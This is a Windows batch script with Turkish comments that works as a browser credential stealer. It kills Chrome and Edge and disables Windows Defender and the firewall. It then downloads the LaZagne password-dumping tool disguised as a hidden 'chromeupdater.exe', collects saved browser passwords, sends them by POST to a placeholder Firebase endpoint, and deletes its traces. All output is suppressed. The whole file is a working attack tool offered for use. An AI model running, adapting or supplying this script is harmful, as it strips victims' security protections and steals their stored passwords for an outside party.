@echo off
:: Yönetici kontrolü yok

:: Chrome ve Edge işlemlerini kapat
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1

:: Defender kapatma
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Stop-Service -Name WinDefend -Force" >nul 2>&1
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1

cd /d %TEMP%

:: Önce varsa eski dosyaları sil
if exist chromeupdater.exe del /f /q chromeupdater.exe >nul 2>&1
if exist results rd /s /q results >nul 2>&1

echo [+] Lazagne indiriliyor...
curl -L -o chromeupdater.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1

attrib +h chromeupdater.exe

echo [+] Şifreler toplanıyor...
chromeupdater.exe browsers -oN -output results >nul 2>&1

:: Firebase'e veri gönderme için data hazırla
setlocal EnableDelayedExpansion
set LOGFILE=results\browsers.txt
set DATA=

if exist "%LOGFILE%" (
    for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
        set "line=%%A"
        :: JSON kaçış karakteri için tırnakları ve ters slash'ları değiştiriyoruz
        set "line=!line:\=\\!"
        set "line=!line:"=\\\"!"
        set "DATA=!DATA!!line!\n"
    )
) else (
    set DATA=NoDataCollected
)

:: Firebase URL - değiştir, credentialsa.json olarak
set FB=https://YOUR_FIREBASE_URL_HERE/credentialsa.json

:: Powershell JSON gönderme (kaçışlar düzgün yapılmış)
powershell -Command ^
  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method POST -Body $json -ContentType 'application/json' } catch { }" >nul 2>&1

:: Temizlik
del /f /q chromeupdater.exe >nul 2>&1
rd /s /q results >nul 2>&1

echo [+] İşlem tamamlandı, çıkılıyor...
timeout /t 3 >nul
exit
